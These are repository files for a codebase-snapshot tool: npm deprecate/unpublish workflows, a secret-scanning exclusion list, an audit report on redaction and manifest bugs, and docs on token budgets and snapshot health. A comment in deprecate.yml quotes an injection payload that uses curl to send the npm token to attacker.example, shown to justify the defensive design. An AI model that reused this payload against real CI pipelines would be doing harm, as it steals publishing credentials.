<file path="snapshot.config.ts">
// Generated by codebase-snapshot. A plain object on purpose: this file must load
// even when the package itself is only run through npx.
const config = {
  // ── Project ────────────────────────────────────────────────────────────
  // Which project shape to use. Detected from the repo when omitted.
  // nextjs · react-vite · vue-vite · nuxt · sveltekit · angular · astro
  // remix · solid · nest · node-express · node-lib
  // python-django · python-fastapi · python-lib · go · rust
  // java-spring · dotnet · php-laravel · ruby-rails
  // monorepo · docs · infra · generic
  preset: "node-lib",

  // The repository's actual branch. Used only when git cannot report one — a
  // detached HEAD, or a directory that is not a repository.
  branch: "main",

  // ── Output ─────────────────────────────────────────────────────────────
  // Where the snapshot is written.
  outDir: "snapshot",
  // Scratch directory; the new snapshot is renamed into place atomically.
  tmpDir: "snapshot.tmp",

  // ── Size ───────────────────────────────────────────────────────────────
  // Hard ceiling per part. "300k", 307200 and "1.5mb" are all accepted.
  maxPartBytes: "300k",
  // Files above this size get a head/tail preview instead of the full body.
  largeFileBytes: "200k",
  previewHeadLines: 80,
  previewTailLines: 40,
  // Different ceilings per layer. Unlisted layers use `default`.
  budgets: {
    default: "300k",
    byLayer: {},
  },

  // ── What goes in ───────────────────────────────────────────────────────
  // Allow-list. Empty means "everything that is not ignored".
  // Example: ["src/**", "packages/*/src/**"]
  include: [],
  // Globs or path segments to drop. Example: ["**/*.test.ts", "docs"]
  // The audit trail and the changelog are records of work, not code. They were 490 KB of the
  // 3.1 MB this repository emitted — a third of a 300 KB budget's worth of parts — and neither
  // answers a question about how the code works.
  excludePatterns: ["audit/**", "CHANGELOG.md"],
  // How candidate files are found: "auto" lists them through git when git can
  // and walks the tree otherwise; "git" and "walk" force one path, and "walk" is
  // the escape hatch when .git exists but git cannot list it.
  discovery: "auto",

  // ── Classification ─────────────────────────────────────────────────────
  // "merge" = the preset's rules plus yours (yours win). "replace" = yours only.
  layersMode: "merge",
  // [{ name: "billing", match: "src/features/billing/**" }]
  layers: [],
  // [{ kind: "route", match: "src/app/api/**" }]
  kinds: [],

  // ── Safety ─────────────────────────────────────────────────────────────
  // .env, *.pem, .npmrc, .ssh/ and friends are skipped unless this is true.
  includeSensitiveFiles: false,
  secrets: {
    // [{ rule: "internal-token", pattern: /CORP-[A-Z0-9]{32}/ }]
    customPatterns: [],
    // Set true to drop the built-in rules above and keep only customPatterns.
    disableDefaultPatterns: false,
  },

  // ── Artifacts ──────────────────────────────────────────────────────────
  artifacts: {
    readme: true,        // README.md
    manifest: true,      // manifest.json — required by validate and report
    parts: true,         // parts/part-XXX.md
    navigation: true,    // reports/navigation.md
    projectTree: true,   // reports/project-tree.md
    audit: true,         // reports/audit.md
    monolith: false,     // full-codebase.json + .md (roughly doubles output)
  },
  // Skip the monolith above this size. null = no limit.
  maxMonolithBytes: null,
  // Top-level switch for the monolith, equivalent to artifacts.monolith.
  // When both are present the artifact entry wins; this one exists so the
  // generated file lists every setting the tool accepts.
  includeMonolith: false,

  // ── Advanced ───────────────────────────────────────────────────────────
  // afterGenerate: (manifest) => { /* write your own artifact */ }
  hooks: {},
};

// Exported through a name, not inline: an anonymous default export is reported by
// `import/no-anonymous-default-export`, which `eslint-config-next` turns on by default, so the
// inline form arrived as a lint warning in exactly the projects this preset targets.
export default config;
</file>

<file path=".github/workflows/deprecate.yml">
name: Deprecate a version

# Marks published versions as dead without deleting them.
#
# Deletion needs account-level rights that the CI token does not have — unpublish
# is refused, even for a version minutes old. Deprecation is the supported,
# reversible equivalent: the version stays installable for anyone who pinned it,
# and the registry tells everyone else not to.
#
# The spec must be an exact version, so a mistyped input cannot deprecate a whole
# package or the current release by accident.
on:
  workflow_dispatch:
    inputs:
      spec:
        description: "Exact version to deprecate, e.g. name@1.2.3"
        required: true
        type: string
      message:
        description: "Deprecation message shown on npm"
        required: true
        type: string

permissions:
  contents: read

jobs:
  deprecate:
    runs-on: ubuntu-latest
    # Dispatch inputs reach the shell through the environment, never through `${{ }}` in a `run:`
    # body. GitHub expands an expression into the script *before* bash parses it, so a `message` of
    # `"; curl -s https://attacker.example --data $NODE_AUTH_TOKEN #` ran as a command in a job that
    # holds the npm token. `"$SPEC"` is a quoted variable reference: the value can only ever be an
    # argument.
    env:
      SPEC: ${{ inputs.spec }}
      MESSAGE: ${{ inputs.message }}
    steps:
      - name: Refuse a non-exact spec
        # A parse, not a glob: `*@*.*.*` accepted `pkg@>=1.2.3` and `pkg@1.x.x`, and `npm
        # deprecate` applies a range to every matching version.
        run: node scripts/assert-exact-spec.mjs "$SPEC"

      # Pinned to a full commit SHA like every other action in a job that holds a long-lived token:
      # a moved tag must not be able to change the code that runs beside NPM_TOKEN.
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org

      - name: Deprecate
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm deprecate "$SPEC" "$MESSAGE"

      - name: Confirm the registry agrees
        run: |
          set -euo pipefail
          for attempt in 1 2 3 4 5 6; do
            message="$(npm view "$SPEC" deprecated 2>/dev/null || true)"
            if [ -n "$message" ]; then
              echo "deprecated: $message"
              exit 0
            fi
            echo "not visible yet (attempt $attempt); waiting for replication"
            sleep 20
          done
          echo "::error::the registry still reports no deprecation for $SPEC"
          exit 1
</file>

<file path=".github/workflows/unpublish.yml">
name: Unpublish a version

# Unpublishing is a last resort, and this workflow exists so that when it is the
# right call it is a reviewed, logged action rather than a command typed into a
# terminal with a long-lived token.
#
# npm only allows unpublishing a version within 72 hours of publishing it, and
# refuses entirely when another package depends on that version. Publish order
# therefore matters on the way out too: unpublish the dependent first.
#
# Give the exact spec, and confirm.
on:
  workflow_dispatch:
    inputs:
      spec:
        description: "Exact spec to unpublish, e.g. codebase-snapshot@0.0.0-stage"
        required: true
        type: string
      confirm:
        description: 'Type "yes" to confirm. Anything else aborts.'
        required: true
        type: string

permissions:
  contents: read

jobs:
  unpublish:
    runs-on: ubuntu-latest
    # See the note in `deprecate.yml`: a dispatch input interpolated into `run:` is expanded before
    # bash parses the script, so a crafted `spec` could run a command in a job that carries the npm
    # token. The values arrive through the environment and are referenced quoted.
    env:
      SPEC: ${{ inputs.spec }}
      CONFIRM: ${{ inputs.confirm }}
    steps:
      - name: Refuse unless confirmed
        run: |
          if [ "$CONFIRM" != "yes" ]; then
            echo '::error::confirmation was not "yes" — nothing was changed'
            exit 1
          fi
          # A parse, not a glob: a range would unpublish every matching version.
          node scripts/assert-exact-spec.mjs "$SPEC"

      # Pinned to a full commit SHA like every other action in a job that holds a long-lived token:
      # a moved tag must not be able to change the code that runs beside NPM_TOKEN.
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org

      - name: Unpublish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm unpublish "$SPEC" --force

      - name: Confirm it is gone
        run: |
          set -euo pipefail
          if npm view "$SPEC" version >/dev/null 2>&1; then
            echo "::error::$SPEC is still resolvable"
            exit 1
          fi
          echo "$SPEC is no longer resolvable"
</file>

<file path=".github/secret_scanning.yml">
# Secret scanning / push protection exclusions.
#
# This repository is a secret-redaction engine. Its test suites, rule definitions and some
# verification reports contain credential-shaped strings *on purpose*: they are the vectors the
# engine is meant to detect, they cannot authenticate against any service, and they exist so that
# detection can be proved. They are not credentials.
#
# The exclusions are deliberately narrow. `docs/**`, `**/*.md` and `llms.txt` used to be ignored
# wholesale, which put every published page and the README outside the detector: a real token
# pasted into a doc would have gone unreported. Those are scanned now. The documented example
# values the scanners may still report are listed in SECURITY.md; they are reviewed, not hidden.
#
# If you add a fixture outside these paths, use a placeholder no detector matches, or extend this
# list deliberately in the same commit - do not weaken detection.
paths-ignore:
  # Test suites: the engine's own vectors, inline in the tests that exercise them.
  - "tests/**"
  # Verification reports quote the probes they describe, including the synthetic values.
  - "audit/**"
  - "package-lock.json"
  # Rule definitions and their worked examples: patterns, not credentials.
  - "src/security/patterns.ts"
  - "src/security/redact.ts"
</file>

<file path="audit/reports/0.10.1-code-analysis.md">
# codebase-snapshot 0.10.1 — deep analysis, final

> **Status: every finding below is fixed.** The mapping from finding to fix, test and verification
> is in `audit/work/fix-log.md`. This document is kept as the analysis that produced the list — it
> describes the tree at commit `a567c68`, not the tree after the fixes.

Read on 2026-11-16/17 against commit `a567c68`. This supersedes the earlier draft in this file: four
findings it contained have since been **withdrawn** after testing the real code paths, and four new ones
were found. The withdrawals are listed first, because a report that only adds findings is not an audit.

## Coverage — complete, and verifiable

`git ls-files` reports **271 tracked files**. Every one was read in full or inspected:

| Bucket | Count | Status |
| :--- | ---: | :--- |
| `src/` | 88 | every module, 17 profiles, `mcp/` (16), `agent/` (5), `wizard/` (4), `presets/` (12) |
| `tests/` | 116 | every test file, including both helpers |
| `docs/` | 22 | 15 `.md` read in full; 7 assets inspected (sizes below) |
| `.github/` | 12 | every workflow, template, dependabot, labels |
| `scripts/` | 11 | build, verify, lint, test-runner, site, audit, asserts |
| `packages/create` | 4 | `index.mjs`, `package.json`, `README.md`, `LICENSE` |
| `audit/` | 1 | `reports/0.9.16-verified-bugs.md` (2,838 lines — since deleted as an old record) |
| root | 17 | `AGENTS.md`, `README.md`, `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `llms.txt`, `CHANGELOG.md` (2,932 lines), `package.json`, `package-lock.json`, `tsconfig.json`, `tsup.config.ts`, `snapshot.config.ts`, `.gitignore`, `.gitattributes`, `.gitguardian.yaml`, `LICENSE`, `seo-log.jsonl` |

Generated output (`dist/`, `site/`, `snapshot/`) is excluded: it is reproducible from the above.

Claims are labelled **[verified]** when a probe reproduced them and **[read]** when they come from source
alone. The consolidated reproduction is `audit/work/verify-fixes.mjs`; the one-off probes used
while writing were scratch and are not kept.

---

## Findings withdrawn after testing

These were in the earlier draft. Each was wrong, and the reason matters more than the retraction.

**W1 — "`includedLines` counts the omission notice, so `includedLines + omittedLines = lines + 1`."**
Withdrawn. `tests/manifest-accounting.test.js:87-101` reconciles `includedLines` against the fenced block
for **every file in every part**, and `docs/output.md:189-191` defines the field as "what the fenced block
holds". The counter is correct, documented and tested. Nothing claims the two numbers sum.
**What survives (Nit):** `docs/output.md:192`'s gloss "the number describes content, not rendering" is
false for a preview, where the counted lines include the notice; and `src/types.ts:385-394` documents
`incomplete[]`'s three numbers without saying which counts the notice.

**W2 — "Three floors for the minimum part budget, one silent."**
Withdrawn as a Medium. Every user-facing surface **throws**: `maxPartBytes`, `budgets.default` and
`budgets.byLayer[*]` all reject `< 4096` with the path and value named. The silent clamp is unreachable
from configuration.
**What survives (Nit):** `partitionFiles`, a public export, treats budgets 20/46/100/1000/2600
identically — a direct caller gets parts ~130× larger than asked for, with no error. Every other layer has
already been fixed: `config-budget.test.js:111` is titled "below the floor is a usage error, not a silent
clamp", and `enforceBudget` throws when it cannot hold the notice.

**W3 — "Three ownership predicates disagree."**
Withdrawn. The layering is deliberate: `isOurGeneratorName` answers *identification* (`index.ts:940,1021`,
`autopilot.ts:124`, `validate.ts:244`), while the **deletion** gate uses evidence — `index.ts:1238-1249`
filters entries against the marker's `entries` then verifies digests. Name for identity, evidence for
destruction. Rule 2 is satisfied.

**W4 — "The presets ownership check is weaker than the generator's."**
Withdrawn. `preset-detection-truth.test.js` pins both halves: a tool-owned directory under a *custom* name
is skipped only when it holds a marker, and a plain directory named `generated/` is **still** documentation
— "the skip must require ownership evidence, not a name."

---

## Open findings

### High

**H1. A credential in an unbalanced quote is emitted in clear, silently.** **[verified]**
`src/security/redact.ts:748-757` leaves a line untouched when masking would make its quotes unbalanced,
rather than emitting broken code. That trade is right. What is not right: the branch records **no
finding**, so `totals.redactedLines`, `reports/audit.md` and `manifest.warnings` all stay silent.

| Input | Result |
| :--- | :--- |
| `API_KEY="zq7Xk2nvalue"` | masked, 1 finding |
| `API_KEY="zq7Xk2nvalue` | **leaked, 0 findings** |
| `API_KEY='zq7Xk2nvalue` | **leaked, 0 findings** |
| `const API_KEY = "zq7Xk2nv` (source) | **leaked, 0 findings** |
| `API_KEY="zq7Xk2nvalue"` with `\"` | masked, 1 finding |

The source-file case is the one that matters: snapshots are dense with source, and a string continuing on
the next line hits it. No test covers this branch (`grep tests/ balanced|unbalanced` → nothing). The suite
tests the *opposite* direction thoroughly — `masking-and-config-honesty` A17 forbids the mask from widening
past the matched span.
**Fix:** `recordFinding` in that branch, even if the rewrite is still skipped.

### Medium

**H2. `validate` does not verify the completeness contract at all.** **[verified]**
Ten tampering variants of a real `incomplete[]` record, each reported **"valid and up to date"**:

```
incomplete[] emptied, count kept     -> exit 0 VALID      omittedRanges = "not-an-array" -> VALID
incomplete[] and count emptied       -> exit 0 VALID      omittedRanges = [[1,1]]        -> VALID
incompleteCount = 42                 -> exit 0 VALID      incomplete[0].reason = bogus  -> VALID
includedLines = 99999                -> exit 0 VALID      truncationReason = bogus      -> VALID
omittedLines = 0                     -> exit 0 VALID      relativePath = "../escape.ts" -> VALID
```

The last row is security-relevant: `files[].relativePath = "../x"` **is** refused ("resolves outside the
repository and was not inspected"), and so is `parts[].filename` ("bare filename") — but
`incomplete[].relativePath` is unguarded. Two of the three arrays with a path are confined.
The shape guard (`describeManifestShapeProblem`) checks existence and format of `fingerprint`,
`generatedAt`, `schemaVersion`, `totals` and `parts` — a field list that predates the 0.10 completeness
contract. AGENTS.md rule 5's guard (`verifyInMemory`) runs at *generation* time; once `manifest.json` is on
disk it is an **input**, and `validate` is the only thing that reads it as one.

**H3. The monolith claims `inclusionMode: "full"` while carrying a truncation reason and ranges.** **[verified]**
`src/index.ts:2907-2917` forces `inclusionMode: "full"` and `isPreviewTruncated: false` on the monolith
entry but leaves `truncationReason` and `omittedRanges` intact. Reproduced: `src/many.ts | mode full | reason
large-file-budget | ranges [[21,890]]`. A consumer filtering on `inclusionMode` sees a complete file.
Two tests look directly at this field and stop one assertion short: `generation-truth` asserts
`inclusionMode === "full"` and never reads the reason; `changed-scope` uses a *skeleton* file, where no
range exists.

**H4. `discovery` is missing from the user-facing config type.** **[verified]**
`SnapshotConfig` (`types.ts:538-608`) has no `discovery`, while `ResolvedSnapshotConfig` (:629) and
`CliOptions` (:683) both do. `defineConfig(config: SnapshotConfig)` and `resolveConfig(userConfig:
SnapshotConfig | null, …)` are the signatures a user writes against, so `snapshot.config.ts` containing
`discovery: "walk"` is **TS2353** — in the config format `init` recommends for TypeScript projects. The JSON
key works, the flag works, `CONFIG_KEYS` has it, and `describe` documents it. Every test is `.js`, so no
test can see a type.
**Fix:** one line in the interface, or a `keyof` assertion so the two cannot drift.

**H5. `snapshot_plan` blocks the MCP event loop; the worker is applied to one of two call sites.** **[verified]**
`src/mcp/generate-worker.ts` exists because *"a synchronous generate blocks the stdio server for about 7.5
seconds on a 3,000-file repository … a client with a socket timeout reports a working tool call as a dead
server."*
```
tools.ts:477  snapshot_generate -> await generateInWorker(...)      off-thread
tools.ts:388  snapshot_plan     -> generateSnapshot(config, {dryRun:true})   ON the RPC thread
```
Not a call swap: the worker receives `cliOptions`, and `dryRun` is not one, so the flag must be threaded
through. Same shape as H6 and N5 — the mechanism exists and is applied to one of several sites.

**H6. The import index omits previewed files, so the manifest contradicts its own file list.** **[verified]**
A previewed importer is included *because* it imports the change, yet the index records no such edge:
```
files[] contains big-consumer : true      indexes.imports.byFile : ["src/changed.ts"]   (absent)
big-consumer has a summary    : false     indexes.imports.centralFiles : []
snapshot_dependents(changed.ts, imported-by) -> []   "0 importer(s)"
```
`buildIndexes` (`index.ts:463`) filters on `isSourceSummary`, so a previewed file cannot enter `byFile`, and
it never receives `skippedSummaryImports` — which `index.ts:2476` *does* use for the `--with-dependents` hop
in the same run. `snapshot_dependents` reads `byFile` (`tools.ts:813,827`).
The only test that touches this (`mcp-dependents.test.js:110-115`) compares the tool to `centralFiles` —
both read the same index, so it passes while both are wrong.

**H7. `diff` cannot apply custom secret rules, so a declared token prints in clear.** **[verified]**
`compareManifests(before, after)` has no rules parameter and its only caller (`cli.ts:1681`) passes two
manifests. All three masking calls in `diff.ts` (:97, :126, :332) omit the rules argument, so they use the 31
built-ins. `generate`, `validate`, `explain` and MCP all apply the user's resolved `secretRules`. A
repository that declares a project token in `secretRules` — the reason the setting exists — gets it printed
by `diff`.

**H8. A custom `outDir` is generated into but never gitignored.** **[verified]**
`init --yes --out-dir .context` writes `/snapshot/` and `/snapshot.tmp/` (`init.ts:458`, a constant) while
generating into `.context`. `git status` → `?? .context/`; `git check-ignore` → exit 1. Applies to `setup`
too, which appends the same constant regardless of `resolved.outDir`.
Three tests assert the entries and all three miss it: `units.test.js:855` (`includes("snapshot/")`),
`setup-command.test.js:59-61` and `init-gitignore-directory.test.js:58` (`/snapshot\//`) — every pattern
matches both the anchored and unanchored form, and every test uses the default `outDir`.

**H9. Two live assets 404 on the published site.** **[verified]**
`https://ankurhalder.github.io/codebase-snapshot/` serves `src="docs/assets/favicon.svg"` and
`src=".../how-it-works.svg"` → **404**; `assets/…` → 200. `scripts/build-site.mjs:362` strips the raw-URL
prefix leaving `docs/assets/…`, while `:593-597` copies to `site/assets/`.
The gates cannot see it: `check-site-links` resolves `href` files and fragments only, `audit-site` checks
alt text and `og:image`, and `pages.yml` runs only those two. The assets themselves are correct — `favicon.svg`
is 32×32, `how-it-works.svg` 880×380, `social-card.png` exactly 1200×630.

**H10. A nested `.DS_Store` makes the tool refuse its own output directory.** **[verified]**
`snapshot/.DS_Store` → exit 0, replaced. `snapshot/reports/.DS_Store` → **exit 1**, "Refusing to replace
outDir … it carries this generator's ownership marker". `index.ts:1240` compares the **full relative path**
against `IGNORABLE_ENTRIES = {".DS_Store"}`, while `markerInventory` (:826) and `verifyMarkerInventory` (:1077)
compare the **basename** — four of five sites agree. On macOS, `open snapshot/` in Finder writes those files,
and the next run then treats its own directory as foreign.
`ownership-evidence.test.js:87-97` tests `.DS_Store` at the top level only. **Fix:** slice to the basename.

**H11. `generatorOrigin` prints a false origin for a BOM'd `package.json`.** **[verified]**
`cli.ts:903` uses a bare `JSON.parse` inside a `try` whose `catch` swallows everything:
```
plain package.json   -> 0.10.1 (project dependency ^0.10.1)   correct
BOM + package.json   -> 0.10.1 (global or direct install)      WRONG
```
That is the exact state the line exists to warn about — "a snapshot whose behaviour depends on the machine is
what a pin exists to prevent." `cli.ts:788-791`, **115 lines above**, does it correctly with `stripJsonComments`
and a comment naming this very failure. `records-and-bom.test.js` covers four other call sites; this is the
fifth, and the only unguarded `package.json` reader in the file.

**H12. SARIF result order depends on the host locale.** **[verified]**
`src/generator/sarif.ts:124` sorts with `localeCompare`. Three neighbours are locale-independent on purpose:
`terminal.ts:113` and `tokenize.ts:75` pin `toLocaleString("en-US")`, and `tree.ts:7` says "Ordering is a
plain code-unit comparison, **not** `localeCompare`". `redaction-reporting.test.js:138-157` asserts
`audit.md` and the README use three-digit grouping and contain no `1,00,` — so "same commit, different bytes
per machine" is a recognised, tested failure mode, for counts and for tree order but not for SARIF order.
Rule-ID stability *was* solved for the same reason (`sarif-integration.test.js:136-171`); order was not, and
no test asserts order — every assertion looks up by name or id.

### Low and Nit

| ID | Finding |
| :--- | :--- |
| N1 | **`summaryOmitted` / `summaryOmittedReason` are set, documented twice, asserted nowhere.** [verified: set to `true` on a previewed source file, absent on a profile-less `.log`.] `grep` yields only the two contract-text assertions. `summary-preview.test.js` stops one key short. |
| N2 | **`report`'s shape message uses a different prefix** (`- <path>`) than `report`/`diff` (`❌ <path>`), and `manifest-shape-guard.test.js:93-108` keeps an **unreachable** skip whose comment says `report` still uses a private guard — running the file reports `skipped 0`, and it does use the shared one. |
| N3 | **One truncation cause, three names:** `truncationReason: "part-budget"` (manifest), `maxPartBytes` (audit.md, asserted), `part budget 4096 B` (in-block marker). |
| N4 | **"Tracked files: 2 included of 3 found"** counts directory records — the run reported 284 included of 294 found against 271 git-tracked. The label is pinned by `no-silent-loss.test.js:137`, so fixing it means editing that assertion. |
| N5 | **Three documentation surfaces disagree with the code** and no test reaches them: `docs/cli.md` prints the gitignore entries **without** their leading slash (the matcher is correct — `gitignore-anchoring.test.js` proves all five anchoring rules); `docs/stale-context-is-your-bug.md:51-56` shows `✖ Snapshot does not match the repository:` / `added:` / `removed:` where the binary prints `❌ Snapshot validation failed:` / `new file:` / `deleted:`; `explain`'s secrets are documented `{rule,line}` but are `{rules[],line}`. |
| N6 | **The placeholder exemption is an unlisted value-shape list.** [verified] `replace-me-…`, `sk-...`, `...` survive; `replace-with-…` is masked. `docs/configuration.md:280` states the general rule "a placeholder is indistinguishable from a secret" — false — while `audit-0-9-16-remaining.test.js:467` asserts the opposite. Both are right about their own examples and wrong as generalisations, because neither page lists the exempt spellings. |
| N7 | **`exportsKind: "esm"` is unreachable**, and `types.ts:49-53` documents "absence means no exports", which is false for an ESM file. The only assertion in the suite is `exportsKind === "cjs"`. |
| N8 | **Two JSONC readers.** `ast/structured.ts:18` is exported and used by `cli.ts:38`, `init.ts:3` and `index.ts:3310`; `config.ts:333` is a private second copy used for `package.json` discovery and JSON configs. A fixed edge case in one does not reach the other. |
| N9 | **The tree's line cap is silent** while its depth cap warns. `tree.ts:97` emits `[tree truncated at 20000 lines]`; `index.ts` regexes only the *levels* form, which `core-pipeline-fixes.test.js` does assert. |
| N10 | **A `diff` payload reason is a sentence, not a code** — and `docs/how-to-context-budget.md:76` cites a `manifest.totals.events` field that does not exist. |
| N11 | **`codebase-token-budget.md`'s "measured example" is stale ~2×**: claims 57 files / 14,626 lines / 603,420 B / ≈165k tokens; the tree is 88 / 26,571 / 1,170,810 / ≈334.5k. |
| N12 | **Eight failure messages do not interpolate.** Double-quoted `"${JSON.stringify(line)}"` in `redaction-precision.test.js:297-298` and six in `redaction-json-keys.test.js:21,25,29,35,74,77`. On a security failure the message shows the literal `${…}`. |
| N13 | **The `describe` carve-out is a comment, not an assertion.** `contract-completeness.test.js:20` excludes `exclude`, `secretRules`, `cwd` as "aliases rather than documented settings", but `config-digest-and-keys.test.js:116` asserts `secretRules` "is a documented spelling" — while `describe.config.settings` omits it, so a machine reading the contract cannot learn the key exists. |
| N14 | **`4.x` test headers cannot be mapped to the current line.** The changelog restarted at 0.9.0 and says "0.9.0 is newer than 4.4.1, not older"; `seo-log.jsonl` corroborates (4.4.1 then 0.9.0 the same day). Headers say "4.0.9 regression cover" for features the changelog lists under both lines. |
| N15 | **Style drift:** statements welded onto a brace in `config.ts:1539`, `chunker.ts:360`, `cli.ts:818,1365`, `mcp/index.ts:19` and `tests/integration.test.js:1351`; orphaned/stacked doc comments at 20+ sites (`index.ts:671,800,1979,3234-3252`; `chunker.ts:286,318,443`; `redact.ts:470,1236`; `cli.ts:886,933,1990,2207`; and others). |

---

## What is genuinely strong

Named because an audit that reports only defects is not useful either.

- **Ownership evidence is real.** A forged `{}` marker does not hide a directory; a directory holding only
  `.gitkeep` is refused and the refusal names the entry; a live-pid lock is never stolen ("a wrongly refused
  run costs a retry, a wrongly stolen lock costs a snapshot"); a failed cross-device copy never leaves a
  directory wearing a "complete" marker.
- **Six doc-to-code mechanisms exist** — DH-20 (explain strings), DH-21 (`appliesTo`), C-4 (create README),
  `repo-hygiene` (MCP tool count in 4 documents, CHANGELOG section, words eaten by control escapes),
  `token-estimate` (the published `bytes/3.5` rule). N5's three items sit outside all six.
- **Three source-text assertions** where no behavioural signal exists: `pathScanRules` must not re-add the
  built-ins; no `execSync`, and every `execFileSync` passes the shared ceiling; no comparison operator may be
  lost to redaction.
- **Redaction is tested from three mutually hostile directions** — leaks (fragments, percent-encoded JWT,
  PEM blocks), data loss (regex literals, prose, `tokenize.ts` as its own fixture), and over-redaction
  (URL hosts, key-name lists).
- **The suite polices itself:** `temp-hygiene` fails any test that creates a scratch directory it never
  removes, and proves the wrapper by running a deliberately leaky child.
- **Tests distinguish acceptance from effect:** "the flag is not ignored", "the EXDEV path really ran", the
  0555 probe, `assertAllKeys`.
- `manifest-accounting` reconciles every file's bytes and lines against the emitted block; `partitioner-budget`
  sweeps every budget; `redaction-bridging` proves no part leaves a fence open.

## Recommended order

1. **H1** — record the finding on the quote-balance branch. One line; closes a silent credential leak.
2. **H2** — extend the shape guard to `incomplete[]` and confine its `relativePath`. Closes ten tampering
   routes including the only unguarded path array.
3. **H10**, **H11**, **H8** — three one-line fixes (basename; `stripJsonComments`; thread `outDir` into the
   ignore entries) that remove three ways the tool contradicts itself.
4. **H9** — fix the two asset paths and widen the link gate to `src`.
5. **H3**, **H6**, **H7**, **H12** — clear the monolith's fragment fields, thread `skippedSummaryImports` into
   `buildIndexes`, give `compareManifests` a rules parameter, and compare code units in SARIF.
6. **H4**, **H5** — the type line and the worker's `dryRun`.
7. Nits in the order they appear.

No version number was changed by this analysis.
</file>

<file path="docs/codebase-token-budget.md">
# How many tokens is a codebase?

Before choosing a part budget, know the order of magnitude. A token is roughly 3.5–4 bytes of
English prose; source code is denser, usually **3.3–3.7 bytes per token** because identifiers,
punctuation and indentation tokenise less efficiently than words.

The rule that survives contact with real repositories:

```text
tokens ≈ bytes / 3.5        ≈ lines × 11
```

## A measured example

This repository, measured rather than estimated:

| | |
| :--- | ---: |
| TypeScript files under `src/` | 88 |
| Lines | 28,992 |
| Bytes | 1,191,949 |
| **Estimated tokens** | **≈ 340,000** |

That single number decides the whole conversation. 340k tokens does not fit in an 8k window, it
does not fit a 200k window at all — it is the whole window and two thirds of another — and it fits
in a 1M window with room for the question. Measured on 2026-11-17 with `git ls-files src` plus the
tool's own `countLines`, over the files present that day. The count moves with every commit — the
order of magnitude does not, which is what the number is for; run `codebase-snapshot report` on a
snapshot of this repository to re-measure a checkout.

## What the default part budget means

`maxPartBytes` defaults to **307,200 bytes (300 KB)** per part, which is roughly **84,000
tokens**. If your model's window is 128k, one part plus a prompt and a reply fits, and the second
part has to go in a separate conversation — which is exactly what the parts are for.

| `maxPartBytes` | ≈ tokens per part | Fits comfortably in |
| :--- | ---: | :--- |
| `60k` | ≈ 16k | 32k windows, small chat prompts |
| `120k` | ≈ 33k | 128k windows with room for a long answer |
| `300k` (default) | ≈ 84k | 200k windows, one part per session |
| `1mb` | ≈ 280k | 1M windows, or a summarising pass first |

Set it from the destination, not from taste:

```bash
codebase-snapshot generate --max-part-bytes 120k
```

## Sizing the window, not just the code

A window has to hold three things, and only the middle one is your snapshot:

```text
[ system prompt + instructions ] + [ snapshot parts ] + [ the answer ]
```

A rough allocation that works: **never spend more than 70% of the window on the snapshot**, and
leave at least 8k tokens for the reply. On a 128k window that caps you at ~82k tokens of
context — about one 300k-byte part.

If you are re-reading several parts in one conversation, the sum is what matters, not the
budget of any single part.

## When the repository does not fit

It usually does not. 340k tokens is a small library; a real application is five to twenty times
that. In order of preference:

1. **Scope the run, not the budget.** `include`/`exclude` patterns, or the wizard's "only
   specific folders" option, cut more than any budget change. Packing the thing you are asking
   about beats packing the repository.
2. **Let the layers do the work.** The detected preset groups files into layers, and
   `reports/navigation.md` maps every file to the part it landed in — read the index, open one
   part, instead of feeding everything.
3. **Raise the budget and lower the count.** One 300k part is easier to reason about than six
   60k parts, and cheaper in prompt overhead.
4. **Summarise once, in a separate session.** Ask the model for a map of the parts, then use that
   map to choose which parts to read in detail.

What not to do: silently truncate. A snapshot never exceeds its budget — a file that cannot fit
one part becomes a head/tail excerpt with an explicit omission marker, and above `largeFileBytes`
(which defaults to the budget and may not exceed it) that is the only route by which content is
dropped. `manifest.json` names every such file in `incomplete[]`.

## Checking your own number

The manifest records what was actually written, so you never have to guess:

```bash
codebase-snapshot report --format json \
  | jq '{files: .manifest.counts.totalFiles, bytes: .manifest.counts.totalSizeBytes, parts: .manifest.counts.partsCount}'
```

`totalSizeBytes / 3.5` is your token estimate for the run. If it is far from the window you
intended to fill, the budget was not the problem — the selection was.

## Related

- [Budgeting LLM context](how-to-context-budget.md) — choosing ceilings per layer
- [Feeding a repo to an LLM](how-to-feed-a-repo-to-claude.md) — the end-to-end recipe
- [Configuration](configuration.md) — `maxPartBytes`, `largeFileBytes`, `maxMonolithBytes`
</file>

<file path="docs/health.md">
# Health: an audit of the snapshot itself

`validate` answers one question: has the code moved since this snapshot was generated? That is
necessary and not sufficient. Before a snapshot is pasted into a model you want to know four more
things, and `snapshot health` answers them:

```bash
npx codebase-snapshot health                # the snapshot in ./snapshot
npx codebase-snapshot health --strict       # exit 2 when a critical check fails
npx codebase-snapshot health --format json  # the report, for a dashboard
```

## What it checks

| Check | Severity | What it proves |
| :--- | :--- | :--- |
| Manifest present and well-formed | critical | The file parses and has the snapshot shape. |
| Every part on disk | critical | Every part the manifest names exists. |
| Every part matches its size and hash | critical | The bytes on disk are the bytes recorded. |
| Every file in exactly one part | critical | No file was silently dropped from the layout. |
| Every recorded artifact present and unchanged | critical | `README.md`, `PROMPT.md`, reports and monolith still match their digests. |
| Nothing unexpected in the directory | warning | No stale file from an earlier run is sitting in the payload. |
| No unmasked secret in any artifact | critical | Every written text file is re-scanned with the secret rules. |
| No value from an excluded sensitive file appears | critical | Values from `.env`, keys and similar files are compared byte-for-byte against the artifacts. |
| No host path or machine identity | warning | `/home/…`, `/Users/…`, `C:\Users\…` and the repository's absolute path are searched for. |
| Token estimate is plausible | warning | The recorded estimate is compared with one recomputed from the parts. |
| Every part honours the published budget | warning | A part larger than the ceiling the manifest advertises is reported. |
| Every excluded path has a reason | critical | `skipped[]` is complete and the totals agree. |
| The snapshot still describes the repository | warning | HEAD is compared with the recorded commit. |
| The manifest signature verifies | critical | When `signature.json` exists: the manifest bytes match `manifestSha256` and the Ed25519 signature checks out. Absent signature is a skip, not a failure. |

## Reading the result

```text
🩺 Snapshot health: 100/100
